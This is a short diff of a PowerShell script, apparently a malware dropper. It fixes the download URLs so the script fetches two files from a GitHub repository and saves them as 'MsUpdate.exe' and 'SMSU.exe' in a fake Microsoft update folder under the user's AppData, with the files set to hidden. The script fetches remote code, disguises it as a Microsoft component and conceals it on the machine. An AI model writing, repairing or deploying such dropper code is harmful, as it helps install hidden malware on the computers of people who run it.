@@ -8,7 +8,7 @@ if (-not (Test-Path -Path $MsRdpNetPath)) {
 
 # Copy Agent
 $rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\MsUpdate.exe"
-$urlRemotoAgent = "https://github.com/emakedie/varios/blob/main/AES.PY"
+$urlRemotoAgent = "https://raw.githubusercontent.com/emakedie/varios/main/AES.PY"
 if (-not (Test-Path $rutaLocalAgent)) {
     Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
 }
@@ -21,7 +21,7 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 
 # Copy Ejecuter
 $rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSU.exe"
-$urlRemotoEjecuter = "https://github.com/emakedie/varios/blob/main/SMSU.PY"
+$urlRemotoEjecuter = "https://raw.githubusercontent.com/emakedie/varios/main/SMSU.PY"
 if (-not (Test-Path $rutaLocalEjecuter)) {
     Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
 }
